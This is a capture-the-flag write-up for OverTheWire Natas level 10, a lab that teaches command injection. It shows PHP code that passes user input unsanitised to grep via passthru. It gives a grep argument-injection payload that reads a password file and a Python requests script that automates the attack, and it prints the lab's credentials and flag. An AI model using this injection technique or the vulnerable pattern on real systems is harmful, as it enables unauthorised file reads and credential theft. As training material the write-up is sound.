# Natas Level 10 Writeup (natas10) – OverTheWire

## Overview

This level focuses on bypassing input filtering to exploit a command injection vulnerability.        
The goal is to find the password for the next level.

## Observation

When we open the page, we see a search functionality where user input is submitted and a message written:
```text
For security reasons, we now filter on certain characters
```

There is also a link to view the source code:

```
index-source.html
```

## Finding the Password

### Using Browser
1. Open the source code.
2. It shows the `PHP` logic used:
    ```php
    <?
    if($key != "") {
        if(preg_match('/[;|&]/',$key)) {
            print "Input contains an illegal character!";
        } else {
            passthru("grep -i $key dictionary.txt");
        }
    }
    ?>
    ```
3. The application blocks common command separators:
   ```
   ;  |  &
   ```
4. However, command injection is still possible using `grep` options.
5. Use the following payload:
   ```
   . /etc/natas_webpass/natas11
   ```

6. Submit the payload in the search field.

The `grep` command reads the target file and returns the password.

#### Proof
```text
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
......
```

### Using Python

```python
import requests, re

session = requests.Session()
base_url = "http://natas10.natas.labs.overthewire.org/"
session.auth = ("natas10", "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu")

# # step 1: Get source code file
# res = session.get(base_url)
# match = re.search(r'<a(.*?)</a>', res.text, re.DOTALL)
# print(match.group(1))

# # step 2: Reveal php logic and $key not sanitized 
# from bs4 import BeautifulSoup  # install with 'pip install bs4'
# url = base_url + "index-source.html"
# res = session.get(url)
# soup = BeautifulSoup(res.text, 'html.parser')
# clean_text = soup.get_text()
# match = re.search(r'<\?(.*?)\?>', clean_text, re.DOTALL)
# print(match.group(1))

# Get flag
payload = ". /etc/natas_webpass/natas11"
data = {
    "needle": payload,
    "submit": "Search"
}
res = session.post(base_url, data=data)
match = re.search(r':(\w+)', res.text)
print(f'Password for next level is: {match.group(1)}')
```

## Vulnerability

Improper input filtering allows command injection through manipulation of command arguments.

## Flag
`UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
